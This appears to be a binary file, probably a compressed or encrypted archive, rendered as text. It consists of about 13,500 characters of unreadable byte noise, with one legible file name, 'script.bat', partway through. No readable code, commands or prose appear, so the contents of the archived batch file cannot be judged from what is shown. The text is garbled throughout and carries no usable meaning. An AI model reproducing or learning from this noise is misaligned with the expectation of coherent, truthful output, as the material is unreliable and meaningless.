h/ߔ<mBg$+OЮgu.1oU@17[dѱԊ+]t`bq73䛱ÒDOsʠ.L7ifMkK'̌<Vnx* ls/Ɓ`-cdM[e7Qg/)Dax(Τp4LE~BDҚv	#(zm=XB~(Fj R
è`-)2i<AL_ׅ.:rqM48KI}I'@Ad2 )4 .zHq֍gwxChaS+Nd{2"9**vrf kM0ȵ5n3Pn+ CODyƿAg;7IW5쏍X崑neLfZc
[*	6Ń:fe:~6zEmz=LU]"&A._y	7U.}av(
LǶWeaM7ht`o<3lVw/ٿE{Z S$vWo0nPh9N#nMΉo}4l+Шv~ <	x1$C2Ťs̢OD Iu7We/g S`b .+O5H4%qJ RTK_jf:㮇J܅(Z/15yM0V3or(cF3R9F	TlK%˶}?ZO8uOG-)Ѹn\ xx pmHkrx3,6:/TBNy綼W6
 z46w-?VzYW?ILV`R۫4O?DdECI>a<pjt tN
z[BpϼH׃<}-yLS~ {[.*1
88R)ݎHX8

)?X"y
5Trlṕ<fNbNNXFcm-T4iJr6)Wპt<u8:G
po_N)SqZ
?T}{bFOq=qX",kiaX]2Jv XkaTr͂ɭDWLMlB{nZ	"I6~EQMrs(K	z{
x
aEސ:RW[<Npp#Uˆq8~gE}Of*(U1"9ȋ7*,N;U〸"W]
3f8Qc	ON
'7hP*ƞpKÕGZL+-pMsXL5ۻI3.u4XOkƭBtrw	ecCh gԣڄ\J-swgiq]ౌ5H J3q'$ePBUxLRm
1? R{ UiLU"ܓҝ 1QW}}.̳+'6AR{RYn9>m艏1SL68LhP|rCn[`:HPI*A*{O^,N-i}3JWW#5<!N(aC4C	GZ#4͜=odYUm]KT,JBC[EFIUX^ۀp,jBFTr
5+ d ΘO)x7goLǉ#33]( e[5a
ݜ=.oGxw4kG.q~cJ8l>ȟf)(~xk
HPP bɊDE3
_ZA'aT䀔S~
x~zn0D=]Ȩ2AMڅ
SzA L
Ph3CͲ䑇\H@1sq6Zs==
c}<\i\K
sʹV
Nnz?hlegӯfVJ }nͱ蠧:0R)#

DdHPI:HirWa
b{1 x1O
yy[#zI{;ĕ_hGb-6iqD
EٹjY<9AS'<"f_)~eUDBR
]<gݺ}ڔW$}AưS
s/ feb
SS#ؠQ^<U2]`i2M2熨Ҽgu8ሤHUa[
iT{eT>)CoM
+ƌW4Tvqq)Szś4#}S6mlE\b?ϔ
o-}RPؗ}UxB}Ss1̘
sB-#.
/(+Ȑ KM1Fϐ
s  7J
pӈg$z졿{9C#kpR$b-B3ZlS 81rc# 
@6@	u1shUC2z)
KB6?
CG\>ڑ.`MDƏeg8Is `VNKt9h2mL  Bvb܀"H''Q͸4s'
M).kˠpE'uyXnx@dDN4?LfOr3p?TǢ(p(cM§
y
# jc)0ԫ*8N*hv_GcHF8DH
[P4eW=)8?BxU-) #ɝ s~.ťN>ejL=y:Ϣh{ZwcpYd6
\AL\4e:fTGM1uzKozETIT4gDЭL@1D/<F?qn+idg9-]pe%ˠ:)xerܧe+d/f_٤V<Jm"22/(Xԡuٔm$	lS V+~M>P
fkҕM5
Ȋ5}IKb.ccB}𒌡Ojsm @TWю]J#/B.jwUo㗑\Mއ퓽'L]7_W3'I0߲w[$XmY*R[X3j.~XxB~ƻyiۤ쩶:GB
GpogiEWN-˻=*8cXאYQ0Js$Qiao((<P0bAH?:k
8tB
-/g 9cc0J9AMRpGo"B'E>.#ꭐʐk|H]Vr1n[FM`lW=70Ƹ
02(#vu~ߴ.؇i6RaLUuɉ6p-8ߏ6I9eMIÉ
¼f5oKW"qWLp;	p{涭{"-?ڼ87a84h0VÇ*{
U
@QaWSj
Uۿ*k*0
suKtZqA
jKI5pnKQD Xݥ
5cA4Vd`Ʒ 
Axةsm DRNk
'Ѵ.6ڂ{j/x? Ox ûh2v>QNf
dkX+뿽`bn
w608߲gq@
Ga8$?xSl/-SiU`mF(p]䍭BdU 5Y$CD`8:n5mV
Oz*9ShKQ$ԏL~bgp906EņLz{΅cCiK:QȐ2yoH\H=H̣AK$w5U
o9\qW? d75Έ"F:?4$خ(l_fHke
[Rqc
nv5-Wk-4
=u[\l$kdU˼kܮ Fyfc4 Mb=r(ɌS3'	Uf!@6@.c;N`xK~lzS>A1sx;EWf6ƦXC9Ï^DɮŞ>с3ޕV6~9o
a)V"Gnͮ+$-J@V@9ƈoSK=1RЃ{e~_7Tz1QL3 <sE.7#$sb
Pj,)A߈)J\/9A)<03o:_ch
Po0TD܎[bB}$9xW
zUʵU6 ya0'wP3ud#Gj
T¶9?Rig"~}Bsȥ۰HޏWr#YnNE3MLQSXWmWj2B)	\]
TP
I4k3Q~~	LZÛ8S\җ3<UqhA*Z`Xj5hj<w5C4TB쁜
aM
~
NY(nlM(eo4QF'G
檙?U7/Ҏ	]c	XǌW6vkIɠL<Brgio.O #q5_#p@F.Ut
 Vm8̤`dU.̳>M 
'(Ǭh(fP͈=ۨKl<=Imn221@V 1O@XId1Y$pW꿘_bYޱoz pc;<L6L鵆N;gwqk\ዸ"q\:_A-= ̆K7	Q9ݽYV~-b]@>©ơuD#-͂Fgag"5hPQIܣx
:OnD o-۳[/7bn l
E _=c =ԋUcIﳶ\
8mru\1Qd]*=B)eq_ŵX «l0p
<
bim"4f`auJ:	d$M aoAq,:bRҠ?FA&SR~&~<C
"jt&⭰<0)1`UQ_Uti?羽αu^&p+vs8NBAƖۑ29_ξE'F#m`ÿJ`v5`k
8C	g~[XG@rKϱxHul.Ji~ XMVYwQwuPG:S]
7PvH$yO(եtbD8g` Wb}1	849ItZL]'}$eمc.{seqtU(l*N@fԄB1 r~l
l0r2֝c4
]>qur2¼(G `)<C)1ʬPz9673Kn(Pc[e oh`2I{Dia@CNJMJx3*Αp"ƅ`[Gz&"γ{$d=J
{X<	c#=Ψ'ؘ	($v8<oڕg]:I5Y͞	6 7)¸mDzoCӌ-אuy;ۦ3ֱrG綏-ވk^m<sZpY4Kn<ߤ]x濊KqԼ_
c<NA@4ah۰ZCw>FKK=Dafp«P.W`<'5YapJR.ڵ~lX>YƋp
р/s*TWwQ	oRTHhkt<' DRz$Cc+rҐȊ{mS'=\Cb$$K̷m2
tÎfàBMؘwޕK-X O5]sb\ܫ9 44nGoX
)hfT
}6k  A.chem_L ZeCOuݬɯ(dC}9[lK.**WZ  bftz~`
V
ot+S6KQj8
 qvg{a5Ixv*`>82fna@E)SOmH>7}D}u)qT]AE:q4L.1K.s1"Jի
`YP
8@P?1>2:Q1##8<P(w)c擕#z
qQ[9-58Th
G8
]0v@zp.s' '@i<SF/
9e@PUg+NJRMal.4P>۫3gz9<<wX.=´68q	ku勨'qru b
ЛE@璎@krA cmAB@qǁUyC39}BK_ RLr2`Hl0aj407E1{ZWp.'ű"#$5S:,1)Kj
ҿ8z><ܦm26VJP)u˪ܨLT95vr7S*[pbR
2`LZr
20(n_Y"Ai	[*8RaoOO 毡0{`$eX/3?j hÍ>5k?v	]dFsѹy͗ǿQtRԭ}flit	߇cmyU_m.nTjF4m*ǫ_"׆Eg
d(tqm~Z=VɺЏ0QE\9{}ݛJ#F}9q B>J}j#jx'/:ɯ2-
<]kqVŔPr
' 7v
 
@6/:Kt˛L/?Vdo{:61aN΢e~B2TӐU4z3 +ى* :l{8obJλ/@  (A
YT/
l'3n:CݎayFz{bFȌ#-Kx}b Ts5(>)_c7
ۢM(`}É
v*ʠʛ
'84\dFyRDKL<̘ͧRhwf u.`?<Ss*s/]>߶yuɂX:f*2bǂ5gu-ޏP-NjZ' _D{c-Zpȕ
n$[wI5\4I"|/sqf,F8gOp'uA}==d.OCqi4yݷFnP
'Gmu1y3sq
#j5
Rd>TV>pk0PغOɬezR	1O9~$5çxՕA--mkk
)r)<̎ؓQ"EG2R'C6 o4A&W-X6Rgp߿7nFj&Ґ]
+Ive )0$$"?;$YN}jHL.Kq~<Nx'4233eƗfKf,/k:-)E#-ݓz1BD]{,L|c4vJ+XoSY#̤ 6C柶y״ή	}:E">᣾'t]/h>/_[A ɏτGQISnןNq2^q@
C J}HYnĽs ƛMYJY[fD:MK9d'Rs`z GԮYxISX\̓ ؚAQ47)9pa`
r	ɵ[3N}Ju0tJ)Jm~XyO
iXDVҰ1Myl[V'k:A.Z9kPJ#gF 	hJZq`2TS lyuVj0n-pFaّPzfon
jڇtϲy¢WA~4$]Oo`T	[s+ZpbeDn6Tc P..>ND C6\G>
" e8/N~7һ(RYQUQ57m|d$W.;78qżR(/TsסHVM)c'Wl\Frg:kPڭu5MO+Zq00pEJ	0pau(Sav.G2}TWz6tΧ[tuO9N-T=d5@LKָSMt[mfWg:
)s*@hp5BuBڮuؒL7`(x恉F{8mو@.V#
AaF('ȻLTpPJT=2 .ȍY[}0ޖr͛ӚvsOu{<Pt
f  ϸa8 .1]>F屡LӉy9D4Vf(Zyq*+*.ZJN)Gt}+sgH<stB=AGvِM$F@FEzr1+3LKq;7K֓]Ň/_K`p7/	u@8)=R]ϫ]UK3ʾrYp>l9@' d:WNrui)lP4)v簒Jl*$ϸ4RZ0.3V
5(E\hIQ]ϴ
ug]7D?1R3ea#B_.ETQ
 7z
h
*#E=dB
׵~E?>sf5"؂}MRRO
bl0
λڣ
lO4
u<]f T`UQ?v"FYB@`~sU&X`Z#݀7|T 1[xӦ'iGϪ
ky_tGO#SGH5׶X\ٺlD
qҢnH5JdB6KmȻ sbghۡh:OA	l= bCYDQ(󫦝͠qLX16~03vbL) D+58b*>Qg[SHdA4
9aby0$25Du9C\SzϧivZNl**ԁ-;LZIiSЭUX :=QָA.6z$ш,زwMu9w@oҴiDV{Y`t\
lBk<2q1L_?bЖ6EBo(p~M(U`t>I9H	0]ޖQd(̽
·ū-܃׋
'N.?͢ڇz.7nY>A
J촙ħaƱv_(Ӻ[*Yj]Cwt8a 97K[/}KX
gɐvM"A0}vAu]G,lJ=@.mػm?V8{ծZ n1FcYN:هG8';Ƿ=.?zFFbw#kx$AOA5c:Óנ=e	ȣz+KU*Ȏ<A߾wfo*G
$	L
my7CЎX:Je{ ?4
}-uUI2+c
])4D>S憎}ki2v8 X84_'?\wg2USRLn r.`}N07Cޚ i
n{u"H~?Ttb쭮4zu`dY(S|\խf7D{M	J9IG?fiAu7 vO<oOIY)/=P_U6pʀNhvUYr#\C"Ӫ
]gp}V'5phZm] {rRܡ%C;jFmWU-{ )+GqoQA6 ~x{
`>&B$F <NBf
qWĀ]XFfu`CpBE99	)kzAMӆwB[fRtU UT/ hv+͖	3=Ym4Y3*"SlfɛHM2ɋJ+4pV
W_- ਭzs2SKç	Y<0tgaБ>8,f,=/ȒflpfĴkrMx4nn~pZC
g
j7 SL	= rƺ/8sHBtTiل><NuظZ,,6'M8Q$

ZVBK"*ɖKyHhi&OT9hn`i+Wp4YE?99*hPlŷc8pܫ.,Q;)ENIR~-Ǿw-uϼ>KpL
pYb ֩wbu8VW\]29ka+Ւ`oD-B)][
2MHzU[]B[
:v*6+U0qXgW˖mẅ4	H $
ȵD}X+	F>3{'e{òDd
o./8?kٌ=6N9C9W0qQ^
.d48ͩH}}3a{}+q{
?PLRaU+A[]mZ GHsP
qxM[ ~?:
=nRh X<+NQKѽFc3:#K tGdI/Ajh3}V:(UW
ۄv=P' Fb' K .f:>FJk)u

A?/`R_? 2 EiJ~؝Z	І6Rp)DqԈMvg4
5AɈy[y7iꕍuUtmFoVntD9_݈Z[NjXΦ
$`lvv_s=2
:`ȎǋRi8{j  <pB
nJOE>&iZ3	v 
*Dg1 O aGn`"HDlȡ(^&~]$M? LP+I
f=ys va<N
>a4ѯ6ޒ<\.z-뢥Yub}ch+(at+WC]rXÊk Y'q  Qq]bDb?))No+Ak6`+kk[2qNeX8CFiNI=Lx٭s{oLbe$736tvaV>}<J\m t
7Fqs[(Q=:yLphHΥ*ñj}{WYOҿF*	=ȇm#ye/?.p½diCk}w 7p1	v7à /VUPFpl)'ĉc)َR캜 6<G*/T}p~
z-F7xgirUё1
* zL)?tq5mlȎ 6lNxgkBEʃ;LD>>$"¬lɃ$vLgl+T2,}j+"sG0MVt;#>.f1sΘwjK+L"yuzb+@p5S"x.ܐ=\a=BE"":G#c2'믨l\HƵ 5\l<!QeTrn\@ya0h6<[m #g̦$\g{`8!a
XBgѴz+c`tP[gy~}
rD?<G0eWЙٺu
Үr5rsVME*>p0NǆdDZ emaVg{E<oٍe㼷e'eNŇD~ 1Q31 \1ʁmvXs7D$w*?
}	Ep:؈EXh
=
"raPPvnIJ9ҏ
 k7cLnRuU" Dگ*˂=P5Pptf&-ƔMS-5AODpG-VzH.?3<g{ROdq+}꽪oTayĒ]HcUET@|U{UwAzպ
QȠz@őA5p9Su
nY
3ɮxdTS7
֑6pq֙2Jj)bҢ fOH:]V#Ak'Z5d/?CMV TħuB^wq6`i/]Nm̝ށp.HjQ]3ӿ9
7
v15@D
LQtHR7n"lpёmVn&z'?ganGɃ)9H끋gLJPՕq6پ"-\mlc/*
[`Q'ڀ<4s0lӥ]S
k~T6
\xrYKIe]33{7).kg7?$fgpT0]]qMi'e1i
J}"o:9x5] B6ghA&Ixw9/g{'E|laIOj? 8u<?HnI2{eɐ&ipNMb΀+w+<d:]]A0u

X	LPcDf?鯪
̚\ƙ[g(@pKSg]"d2;*,g+t;::[]M#/=|Dǽ[Gp5g$H3 9CZj~btX0̇Bdlz
v#G9kֱtb"DD(m]o2,P_ZhJ:j˕C 5 ꮂɄoΘ:ẗE)>nXr=sj44P"Zͷ}o7DffwRP
I(kgIe<I]()4zf ]1
-DQX\'
.Cw4-0U>"t<JAvm._	4ꄝTU97>/&b3 WnS+)~:H,4@܏8B>?.X]=w>W<cBP`'dPgVFR/iS->8 1y&:ؤ5B|I(E5{ii[M4PMތ|E:X#uɼThs4녇e$wOQ*ca鞅@{H>T7Қ
̧Mlk{SٛSg{sD۴{D$hiXQ4o2cM_沕RU
=)-l.nw}XAêWsAvoW.)}QrBCa_=/N<ZM#meEqc;Lw֒Y"zjVG֤x@N0qSC\W	QGCrj͒7Lv`fFc|'ȋAg"O=xdo$ǙGC}:F1
馫I?#BCl)*~xDzαWo13ѕciF
>R:6wnԥX~k_qA)ڌ i
OYzKpiŰ>  *#ƚ$߸ѳ}q.t[GOPVR.1uA]@~Z1[}ξ-o~ xgY˓
u"MK*I2LOS?1bOm	P<&(ڑȧvߐѦ\eeh)M7JWhϰ݋,>C@nPhY,tf /,|̷{kUOomnl׼zRĺǯ`S͉Cp&š=altm&;@Fzvt"(٤uUi_=-cNI*ZQ+̼yцg(ߖ
HN+bWg?ṇpĈAMeTV7:q+Iܟ[熰Oan"~d[jgKgug&saýP<gSnV;htM:*yӃ&&옐 <m`<TY|$iLؔ󈴎WU\t}τ8Q*Ԣ-Na"Jpp.$NRziBjGH{ ]~XIBZ #~UΨa-Y_ε~3$`ȋܓ
J$ΛS?q_k{E(m$b$*;ԖMLgf"ܷF?yJ#ڦڢPpD2qi	7WWPJ:%uD
0KVmrn35s3Fթ'd=pu94\kmeՋo9żn
6x}M"aCwVFSpA<rhMX7V{tZ?m/~

93v]Շf/k9Ô#B̾œ'Q.E
ZTR
F/锌
[	(lSC+Q@>I
p	sR=S*
x2ˮԞ{"cg_׳.=$Ifuc@i"V \n9e?ϣ)alZi4֑l(w 
(DK{˺Tʽp\PyL-
4ف 
UW~܉gpO 9Gpg=- )_F6s
[d>MFJyq:(t7= .ט:hY	v֒ο7X3F4܈?֜XK?nPb_ںtukUәu6<]pRUJLj`f'zuhFq*MF~DX? 
0v@}ɲ}V1¡SXv4dq-jTߣ34#oZϕY
ŕ2)
qU޼ڽ̋ճT7<bZ]Mc%	fqi9#rCøkP$^^=ւ䆫GH<u=0	9N;>z?
"3N
SؑdH6Iu܋A𣊿큓{@
kh n7?.vb
:L=\Eg")4)2A>`漢Zm'pFk|	[Fy`AhA*g]CUb@W|arsAk*ᶈ5	VCEt#N3A&bUȔFvkHaOuBrPWH~=)8
<bp숍}?Ha2ׅ[HH'fW2q%%#nYha~TNRIN2 e
LD.0R{K͢`Ͷ5dUƖ-'UY<0.E)<BkjTj<FE,di)ٵ:>y=Dk41<Crw
YBt~6*pH`crq>c{47͙fxA>̇gs"sݟCCàǤ?
pM
:`+V/$iSDͺoj!@u#ۃ+v-*whpftt/kL*)
/6*ڷ?CȊ㕬 õ5X{@R۞38ې<Tb ˏaSZ<Q+Es;
li^>#N.6X+бs/.:p9c}8>
L:/k9-Hbgk󻧁3qi:
`xo49W}u)j5pdvJ9<SEpA-?v> oTAVLe0Qn.n5F	dUjȼ:J.~.Fd9k9Wvx}C	jPXtiaҀPHp aLBDTRB'"z/*t5\Cګc9`f7/NFDQ@YAl{ΊoчyW<I&Ȁwc/ϓ1G
Lf(	z8~T>"_̯Pl|#-OLSE/=D:LaSJޑpR=xoCI.	:1`z[fxE]x	TUC­BR5>M	:k
q6b
'	[9[2umL9Ak-$z+P_ ɶ<Gpjx
_ksSgN
Jsxŗah0/*00@sm\A/%1/dd=] L"4;ġ 6-NjXtV+z_x{|"pĒi5@aZj
oD(uG-d\aɸ"m΢f1gygܵo@Vx2
5lXo%¤kA%BYE	gb<?6N
d궚OQ)[BC
 om{u\EZ͛HPFp7xqX?'9b#P*W$$S Zѿ\_+<zIz)	6l¤m# R]c DH	pbUSv:1s tx
}ZL#yKL<Vd屙  @]<WĎ?,Z(X9ݼZW[4]0T$ЀB_.s=ZBQgNbjQप~˄O-CUJqȼү Y/wgZ'Y$wy
+i}m/V@:˂u K텡_ګ4Ij޷~_F)-2uk M]if5Ӹ2KBjd*D4+]?r7V'{-u{MxNm4B:!Xz>HIK*
¨@
~
P}y9Z=R튾"NVN<
LVVծYQLcA<X+[WL߿<+:- ăc>8@SOVM't@yiO:>C'p>
=> x{H0ҩ7L.)4ZvA5I"8FPH
'V\L#(P`=\:iE{@$1:3GR *b'7MTEvsBes^uJd9Guk:epj"
BV
<gW3G`*s ] CpWXc<?B4z:lҭf1Wb/7쏚c`N-M1tUsڠm
unL=9-FD ޲X?ڡ-Р?*ZN'
$M2 F5޽pČp_	C~ zZCMėMkP
eXGP_az͑32S͎z4<nY? h/w->eVu(Խ?"q3rRA@Xg.E
18ے?܅ R	׹>L
pw3ERď-:@@v2-u5>2GxXFI2c`_I;jNP:뢩A+13I?;5GntD3@lּOR/,dJlTO؋3K=:"Wm7xܐ& Sߨ,"ѭu{Q
@z<6uuPNƭt0/QF6Lg4i 8q@
`/bl_GĿTO7"3g{b٭vFe4/)G/R
-ّu0g'W
'?1>G>q*MjBua1Ӌ$ckXAGx')\}.]{<ETܙ ?Կ{{":/m`wԊ`:C[pR|兟H 	pAz<<	W
+N1
K2Pg> PEn]-Uֶvk45
mo"9\qqEʔ(7 V-VsQ$5PJj?x.$p(oSiIs)辞$
ȴ Uח)냋 7]<?[Zj~D:hÏGdķjϡ iEШ
"2 9)
jZ6)qY.Ca[0LUsCNkMZ
Lp><@\d<k$3Eb9@6v7Cx'+TTuZ=:}RJƧXgW2 q =Pzʥfݷ/x}{gE#?c
W P}O5<fރp\(H
}Eg8+PUD49_2FmNG
Q2Yd]dVqՁ]a  *`o:ʲ-e
.Z=cEcqi95Zz`- y>Cpn/}K(x}~$
F)j6S(RE*-di$k@3\H7 zV{:P_$3L=.xGF}ʘ  /Q
e+aH3Gy
"'P3@M	S_J3#k/Ƭ|` VX6dg^8H+
F\:*
'mNeJǣ@q Y`ՍM9T1.vA1 Ͳ脼aQ(#L UӪN{B]
h/Xa(dP0Tk
̆YE<t$XP{(Set<	i񽸍ќ6]DUt<OD/[ur[
t}gC>
AQ6RQL7ItUx"Ii w0NZN`pI5&+uƥٶ{.ʛY2u౔\46 gU57Ƀ[iVB=9hitOW=Iu`]rVv
u_˿M T/@Яq.[tnu?L B+v\VyӘt/{
aw0ve} K՟v7.-x4O
׏")&DPnWV@"0#5f)u
`K~mm4=D_ʔ}V	?.)P`/=
5 -ʼ\=k+)2Ttn0PGCˉ7\g̒΃܋RӗvgI~fF/`3
`jkrq{אt%3
E [S z6vacd} ~nkgWqY(Yi*z`NY+̑O+
XҼ( 6ceu_`xdrSL ez )
)7	=/cpF	ɀ w"C5HnѦ{Z[
yޗ4o.5rH-r*gAJ34`l"S};-sϓ
1
script.bat	$Y]ǰnR`qnQפ1n 
H6pizD1/*3#իU7B`	:vY굢rgOx	#c#o<#ٰ= Y۠T}~ԃfDsZed"R$7kD-6F@Գc+#b6|B]b
Y"CX+raƈ}u[P=WR'0R䗚fƈ)Z|;	XĤ?(<mp|\|930W4c3q>Ygil2{4}
sз Va-. WVP`i{Lq9=ԯY\ b"'[dYTNdiHP]AN3Yˌf߿J]mQ5rUs\Cy'7ACm A,Fn=nfXԎ,:"s7d
w/1 ʞ͞wJr~g2J`@RT5VKq}+/iZɊL+z@	V5ȅ#i*Lr]mQocTEצL辎
l+)J[h'#Zj`U Hڏ4(rJHqNYXOh- bUQBV(Eu\W>)S^̫h庴E\06V4G
@sS:6l #Mʃ
 8X7'8JYPeF*̡Q拥S\Cf
of"pc~Јe# @~t$\+]/kWYJ(rܰ8зu@*E&iS֡V?D."r:k[] 9e'awA xE
`aAouŢkWn-gcz4g rk{3TH8shaoDsb*7qFTN{0cfQQrŕF*FV/I~
p a6Z3sytS+N{;eNC)Erq쯏K> Ir
/ RKG VŲ"w\;*y3&=5$VufMҸ4>:٫>ʩ7O<i)4g7"';3h {/AQ]8(:]EU0=٫Wpm0g
cUN{rv[z?S_Jq3Qz	ޕhp^^ R)	m=w;@֚h辪_\
Z7fRCDݪ#~mNw2~E
 9zGv+lX܅hO#fY  {hÀfX~\Ҳߚ6y
wRHw{(ܛJ299`jluA: ¿fq4om?]J8E~՟)릒XLvP~GfglYQAF?s7ؔALilK}®z,b=Y~d=<xi xE~y
6EC"]`Z:QG#WWl-d)JCwH~	5Jb?ލK(b 3br@Yj=~ˌ)nzZŒD}"+XIy`71{" 
niE[z*pm[(̎mN+Px2{6yU[ q=a	n/_w8<W)l~YY
+)S0c3Ms/=h3ݞGD*U `N58+#>@낏O)rnB?B[0
VOdVR($i-T:wVr BWLHYCVI!D9_s6/J.:[qQA~g*b5*"rcliT
T ]s{dH"bT=[@5qRd@ck;"ّnSfsMVXcG4;]8SᙝY"./9Jf-﹍*VǱ.~ QPf"P
_2ۘ5UrrTW Po@AL3 Ӽ˦K8@
JER(
*bX#X]I*j)`v\1W8tqwYK웸s@uk
 4R>n=\}O/w F[E9Sp [ AK5bUU
Mǥ>GuW8I1CE2aܠj'u䰄'q`j/ ۙ/H-֑0h$@L$m+Wz
j `XNu?>bbB
0
iY4<\eATΈL]ެ0ܬg
b_*oV<<1ZJ>Pl.jd	/in̣#D
 d2Ᵹ[+yvP Rw#Ǵ)CN#kI8P
9q[{r@EsyGYoXlFNuFqIi##TMU.n
)Ih"/SLhk?3gqd.~d-D};VGLXdۉnj]p\ж5?nQlMtvCݳsU1R~HיkV7>(,"oQw 
AR.("&Ћ{qVE5#+.Ցߵ)deπ o$D{3ޑ3k]wiT+:k@T9g9tA*WV9
C$j-]ui[fKdt1pB
qG6l{j Jjȶ$@q#{tM:yJ~܄
<>&[. 'vՈ"?nrU粋XR'7'D4{#Naő,\w?9͸`GY@:fLOȬ<bJ#.rDTgeZ彛bP@cδ;;+K'H 6L	#67E;טؿVN&.;0ɶ,a:%
pP=j?@ 8/=~`BKW9j-OeMzP .'?	).	gd_$k82HRh'RaYN(#.>@]GA#TWo*nn׶h4<?健XnWPc9ŏ
RFlIxecܽAV_
{`Pnk1r(hj[D0dF
H߬F ڵpKEaS`Ň
fW2mE"> vZp}'/Sr>1UMmOW?aX8v WIkuiA	D>j/RgaW3TG?)HcaNxg8b@+Г*;}#3/(Kv.#*k5a3 >,';9bL#v\57hуZf_"nu56{6>ǒ`aoiq_NH3t@ y=Pmh}pL
N\߻
D\Tn>C3RT-fc=tt3ߞY'uE-ޒgn2{JuaqtmAc>O6C	R}w^<I( ./i2/ Ab7t~08U]stva#EZ19ktx_l* 6Y92{ go\A)T\s>Ņ_~kI.	/uW}<
ˇuk0T	I3n2iպ\YYsdAzmbpvv0$`@LOB)(
PF
[ ˫~\Y
sxvVhzQ>&46X-nw>Gqjux׈}>=4E
QHRR`X"x8}ev=C
"wD4]wYU&jz9ؗo.#}O=tۡl)Ę|$>
(g=cja 1>:M5E.N\[ȷ3:r
p
BLZv'AADAu/
s
:eYbEGy6
d+mƺbu_iW9ܹĻDvDPC Šx]]kr)zK>it.Txfé`mLޝX
 oh`_ZÂWLewF+YmgGkhK'*ŝE[*@:WrO=mcN9n 1siZ1
ͩU{2_~SU:{{6/{d(׷u_KQ 8_H CSrONmez*A6b
"۝-3E $N*:5*"
T39]]sFNyJWS
1DO#LKDA(5Gd䀋v
woQv'O{ L IX>:ͧڬ/XSn#N
eOߟVJ sXZpޟ_y/eȈA[ 	ۤ <]_bSwv?qdm~ػk6JBűlk1FKhN[
c$*@ oz
*_JQ3QY?]v4֭EҠp2X1wRlq[_: Q
gQ]ɳi}qN7\
GqFKٗyÇ2k3_Fql6
< Y)F$p11vt
A#eteS",d\D QwN]XQsgʆQHkB8&NaP]
 SfTF9NJ)EB0f
д Iql- #RT"v@6WRsP?βgO$΅C#UeC+⫓X+?Mkf"}q .msO{	(y]{7Ou
 hEp=h CJ
] Gp.K.<v~Dip{8
 :v mE#߾bGw~FJu72Nܜ5`[=扙 ۝9
pu-DcP ҇ObW]sm>/'
l ).0>yNVrҤ˰WS\
oE
Q([CvWi806?B
 (\
Հ54ܹ'CFUB)/0LҮϫ9ٙ˥_TF+yq3)QAVƯ7:Ln [yme-HI
gu}0نӝgcF2 p2ⶅ7`agPdÌ˙Oxm͘T_;\#/^6å=*fvM6'iC yq>ۼOh<~1<nzy_6}g}?Ǵ>AjZZS!g=¸
p.EZhu.׽ kfY)DYa
ة{"(L_[U(X9KgmRdGsQ<{*`m)$:sV@&mLYqzYl
uSLa?=1>QDy O3fZ:އ<1
D/1+"pa[͑T9~r,漳=Ƣo\=o;s7P9C	:Zd4R./0} P4ׄ(qDlN-hr`NF1J	:y'$fzg6N׸-T@Rr}aԦ5,4P{X=<h TIP*6߾DwOcb_2=K>obsdZqcDRaOswyeT{fg	Jk
J f#+G?l[2Dc(_tFZ`Qk
	}ug/15K~3Uo4xZ
Žy/ǥEap/dj 	RFŌais,[TaA_$b6ڮ}#v% .-V
]Fƣ"n͗
p
AB=X( >mA=xhk/X'S? fhHoQ-S W_ǻPc?Ql~Iԉϒwi@ʾoNxC?Xä9cKaķ"heZ]XBB.L@'Re|\Wx9CoL|b/i>IGTsZb${-F)M;8k#c̑Y\:b8p^ ֐ʒC.20*{?k	m12Dr4s7Ldֿ!)Sp
6]
A.kQ"Yq\([Y_~85JA) hً`
) .
UP3)ƇSK*ԋ"}1{Ion[,0D2N
~ưoGg3["ٮQ@;3ѷo/<x7~x&73qXlq5԰wL_ڨ.mK@=e e"C}}xdI"r'wȦcyc@1,|c&OY\pư;nBhG{BN+vx}ף74آ
r+~F7]:.d:G@{mqYg/b	4HK9W>tT
-Lo࿠_:6b50([`)4+
[KOp趬yRHk>- P.]7$ YrDxJ*?XWZ>PswBQO\cl`M؜Tnh/vgt睢Ǣ.@+7ѳ9IClpuR"'7*JzF,;܎s^ɵ`0g(7SѨܺ^J_EܶUyI 涬Gև|Lޯ
}n1m.ŇN16G+'ch\]Ε[#Z?2KpFs Z
sʖq4eYn5(eEN\6{ӖPmyz_
yXת=USrnvy\0C\]Vu\C  _Q=K/0[@A6;*pYB4
qCE#kRo3C27IyohY)V
1/Ljcq
U(LB)48['hh3-OkH[ A5"PchKstJX;[־d$IvڑsX:&LC 7R	m5P*ĲODd(bowHv:7Rr|cllW~#]b'tNU{#yٳ~QlUB	Ъߘ렰|FgVVk_	1ɋk6i~gLq$"	͐
>)W.ˌ1xAYcLC	<@̱p6SfZ?jGOk	w1)
D)FߓVEMݓ7Zd-8+OXZe]RDR2 (G)ȎGڽc
)Vkմv<߷zDZuVؾRzHfzg㾃~Ro
UX9si-nMw(9c/H~AT.ZDQ]RjɣoMxʜ:] }̾0[tA3yx7Ĉm/"leF(k]Qx<	Dwe0k?H{I՛IB6_a5Ǧf
Q	 pu	6s=5UT;Pꊄxhq+};Sut84>Y7`F	yjs$2
Hs}1
UC:ơ.)A
Jjx.x
?s{wW
o
S~.uq[lb$Ӝ(y7]_(1iNTʡ/[vmӽW0NRFy?D
<):gܔZLܼ_v$cΊi	9hX*W?	uyK.G
;p\
xK}K
oD6L#͜=l7)Rq?a@Url?G}{^<'eteV
i>d~4]pnk2s>٠oUfY.dX~.PW`[ H?dRR
A

96uUr7xmgS[X:jp+ȅχG `PeTU7'Od:p<@cYX* GjNNe"?ɲn
{S+DMd*9xw
\ytg)/-洂rEW$iiL\ IIcmIu ~D'S ȶ2.* `GYgFxGr_U:if~5ä J  ⻰<zC1l-~3O]T儓kFntƆhCP`
D.@el_awoQB~cCb`on؇<y8e	獿XƁ y7˽6I	c{	᯵:J#UԤX?<dpM5HvzߧbѠT审;)7, i^SZT
w#8Cx_F{m1.u)FYm	ǑԀF#$a*	D(G@+L'8yJ_hPԠvtay}9YgIƪXntFXGmͿ(#>X70[Ye*(Iȩ\}e/w# !V
oБ58NqqDTH9 ҳ{6侘Ƈb_#]MJI r42mD
q0- }r1B	za5ҟl=N$o[TQ
֡=OBF@f2+ISS}<C=}Yh`X9~甜{wƒ
Bu5@R;^TK{6ӓ{	4[ɕpSWe[Zw˩R>i?z5j0Xhh!]7!,Gޥeg-*K5'HFC	3;B$Atj!da}>I"O
dt2(>weK3?}UlWSW55#4 V u*r
o퓈I1UQKL).PU$NWe
8r֓`_zCxuM\"XD5$~cbSCWYbg\3M
U >:aZ`p8ƩL+4p9ծۊ=aޯq3gw#.Y+bP]FSAeBX蝮BqMVIc2X961Tkk6
4W+(/곣Zлj炯jSߧgXiM
